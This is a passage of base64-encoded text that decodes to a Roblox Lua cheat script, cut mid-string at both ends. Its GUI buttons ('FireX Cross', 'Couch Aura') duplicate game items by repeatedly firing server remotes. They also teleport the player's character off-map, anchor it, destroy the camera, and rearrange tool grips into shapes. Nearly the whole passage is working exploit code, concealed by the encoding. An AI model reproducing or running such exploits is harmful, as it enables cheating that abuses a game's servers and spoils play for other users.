SwgMCksIFZlY3RvcjMubmV3KDAsIDEuNSwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDIsIDApLCBWZWN0b3IzLm5ldygwLCAyLjUsIDApLCBWZWN0b3IzLm5ldygwLCAzLCAwKSwgVmVjdG9yMy5uZXcoMCwgMy41LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNCwgMCksIFZlY3RvcjMubmV3KDAsIDQuNSwgMCksIFZlY3RvcjMubmV3KDAsIDUsIDApLCBWZWN0b3IzLm5ldygwLCA1LCAtMSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC0yKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTMpLCBWZWN0b3IzLm5ldygwLCA1LCAtNCksIFZlY3RvcjMubmV3KDAsIDUsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTYpLCBWZWN0b3IzLm5ldygwLCA1LCAtNyksIFZlY3RvcjMubmV3KDAsIDUsIC04KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTkpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtMTApLCBWZWN0b3IzLm5ldygwLCA1LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYuNSwgLTEwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNywgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNy41LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LjUsIC0xMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDksIC0xMCksIFZlY3RvcjMubmV3KDAsIDkuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xMCksIFZlY3RvcjMubmV3KDAsIDEwLCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtNC41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC00KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0zLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTMpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTIuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMiksIFZlY3RvcjMubmV3KDAsIDEwLCAtMS41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC0wLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgMCksIFZlY3RvcjMubmV3KDAsIDksIC01KSwgVmVjdG9yMy5uZXcoMCwgOCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA3LCAtNSksIFZlY3RvcjMubmV3KDAsIDYsIC01KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTUpLCBWZWN0b3IzLm5ldygwLCA0LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIC01KSwgVmVjdG9yMy5uZXcoMCwgMiwgLTUpLCBWZWN0b3IzLm5ldygwLCAxLCAtNSksIFZlY3RvcjMubmV3KDAsIDAsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMCwgLTkpLCBWZWN0b3IzLm5ldygwLCAwLCAtOCksIFZlY3RvcjMubmV3KDAsIDAsIC03KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTYpCiAgICAgICAgfQogICAgICAgIGZvciBfLCBwb3MgaW4gaXBhaXJzKGdyaXBQb3NpdGlvbnMpIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IGdyaXBCYXNlICsgcG9zCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IG5hbWV0b29scwogICAgICAgIGVuZAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZnJhbWUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IG5hbWV0b29scyB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQnV0dG9uIGZvciBGaXJlWCBDcm9zcwpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJGaXJlWCBDcm9zcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBuYW1ldG9vbHMgPSAiQ3Jvc3MgRmlyZVgiCiAgICAgICAgbG9jYWwgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkF1cmFseW54IGlzIGR1cGluZy4uLiIsCiAgICAgICAgICAgIFRleHQgPSAiUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLAogICAgICAgICAgICBCdXR0b24xID0gIk9rIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICBsb2NhbCB0b29sdGhhdGl3YW50dG9kdXBlID0gIkZpcmVYIgogICAgICAgIGxvY2FsIHRvb2xzID0gIkZpcmVYIgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgfQogICAgICAgIGNsZWFydG9vbHJlbW90ZTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgbG9jYWwgZHVwaW5nID0gdHJ1ZQogICAgICAgIGZvciBtID0gMSwgNzEgZG8KICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDom5kbMOqIgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIHRvb2xncmlwID0gdHJ1ZQogICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgd2FpdCgpCiAgICAgICAgbG9jYWwgZ3JpcEJhc2UgPSBDRnJhbWUubmV3KDAuMDUzODMzMzQ2OCwgLTAuMjY0ODEyNDY5LCAtMC4wMTc3NTk0MjkzLCAwLjk5OTk5ODYyOSwgMCwgMC4wMDE2NDAxMTgwOCwgMCwgMSwgMCwgLTAuMDAxNjQwMTE4MDgsIDAsIDAuOTk5OTk4NjI5KQogICAgICAgIGxvY2FsIGdyaXBQb3NpdGlvbnMgPSB7CiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMCwgLTQsIDApLCBWZWN0b3IzLm5ldygwLCAtNiwgMCksIFZlY3RvcjMubmV3KDAsIC04LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgLTEwLCAwKSwgVmVjdG9yMy5uZXcoMCwgLTEyLCAwKSwgVmVjdG9yMy5uZXcoMCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMSwgLTE0LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMywgLTE0LCAwKSwgVmVjdG9yMy5uZXcoNCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoNSwgLTE0LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoNywgLTE0LCAwKSwgVmVjdG9yMy5uZXcoOCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoOSwgLTE0LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAsIC0xNCwgMCksIFZlY3RvcjMubmV3KDExLCAtMTQsIDApLCBWZWN0b3IzLm5ldygxMiwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTMsIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDE0LCAtMTQsIDApLCBWZWN0b3IzLm5ldygxNSwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTYsIC0xNCwgMCksIFZlY3RvcjMubmV3KDE3LCAtMTQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxOCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTksIC0xNCwgMCksIFZlY3RvcjMubmV3KDIwLCAtMTQsIDApLCBWZWN0b3IzLm5ldygyMCwgLTE2LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAsIC0xOCwgMCksIFZlY3RvcjMubmV3KDIwLCAtMjAsIDApLCBWZWN0b3IzLm5ldygyMCwgLTIyLCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAtMjYsIDApLCBWZWN0b3IzLm5ldygyMCwgLTI4LCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0zMCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMzAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxMCwgLTI4LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0yNiwgMCksIFZlY3RvcjMubmV3KDEwLCAtMjQsIDApLCBWZWN0b3IzLm5ldygxMCwgLTIyLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAsIC0yMCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMTgsIDApLCBWZWN0b3IzLm5ldygxMCwgLTE2LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtMTIsIDApLCBWZWN0b3IzLm5ldygxMCwgLTEwLCAwKSwgVmVjdG9yMy5uZXcoMTAsIC04LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC02LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAsIC00LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTEsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTIsIC0yLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTMsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTQsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTUsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTYsIC0yLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTgsIC0yLCAwKSwgVmVjdG9yMy5uZXcoMTksIC0yLCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoMCwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoMiwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoMywgLTMwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoNSwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoNiwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoNywgLTMwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoOCwgLTMwLCAwKSwgVmVjdG9yMy5uZXcoOSwgLTMwLCAwKQogICAgICAgIH0KICAgICAgICBmb3IgXywgcG9zIGluIGlwYWlycyhncmlwUG9zaXRpb25zKSBkbwogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBncmlwQmFzZSArIHBvcwogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBuYW1ldG9vbHMKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2ZyYW1lCiAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSBuYW1ldG9vbHMgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFNlY3Rpb24gZm9yIEF1cmEgR3JpcApTZWN0aW9uID0gVG9vbHNUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfjpLvuLFBdXJhIGdyaXAiCn0pCgotLSBCdXR0b24gZm9yIENvdWNoIEF1cmEKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQ291Y2ggQXVyYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIG5hbWV0b29scyA9ICItLS0tLS0iCiAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLHtUaXRsZT0iQXVyYWx5bnggaXMgZHVwaW5nLi4uIixUZXh0PSJQbGVhc2UgZG8gbm90IGVxdWlwIGFueSB0b29scyBvciB1bmVxdWlwIHRvb2xzIG9yIGNsaWNrIHRvb2xzIG9uIGludmVudG9yeS4gSXQgd2lsbCBicmVhayB0aGUgc2NyaXB0LiIsIEJ1dHRvbjEgPSAiT2siICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgIHRvb2x0aGF0aXdhbnR0b2R1cGUgPSAiQ291Y2giCiAgICAgICAgICAgICAgICB0b29scyA9ICJDb3VjaCIKICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsZWFydG9vbHJlbW90ZTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgZm9yIG09MSwyIGRvIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgIHdhaXQoMC4zKQogICAgICAgICAgICAgICAgZHVwaW5nID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIG09MSwgMTI0IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJIw4PCosOCIMOCwqVhw4PCosOCIMOCwqVuw4PCosOCIMOCwqVkw4PCosOCIMOCwqVsw4PCosOCIMOCwqVlIgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZCB3YWl0KCkgdW50aWwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpID09IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgPT0gbmlsCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgICAgICAgICBkdXBpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgd2FpdCgpCmxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgaHVtYW5vaWQgPSB